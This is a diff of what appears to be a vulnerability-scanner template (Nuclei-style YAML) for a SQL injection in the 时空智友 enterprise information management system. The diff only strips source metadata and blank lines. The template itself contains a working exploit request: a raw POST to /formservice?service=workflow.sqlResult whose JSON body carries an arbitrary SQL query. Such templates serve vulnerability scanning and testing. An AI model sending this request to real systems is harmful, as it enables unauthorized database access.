@@ -3,12 +3,8 @@ info:
   name: 时空智友企业信息管理系统 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ggy80dz2gw8me724'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ggy80dz2gw8me724
-    fofa: 暂无
 http:
 - raw:
   - 'POST /formservice?service=workflow.sqlResult HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Content-Type: application/json
-
-
 
 
     {"params": {"a": "1"}, "sql": "select db_name()"}
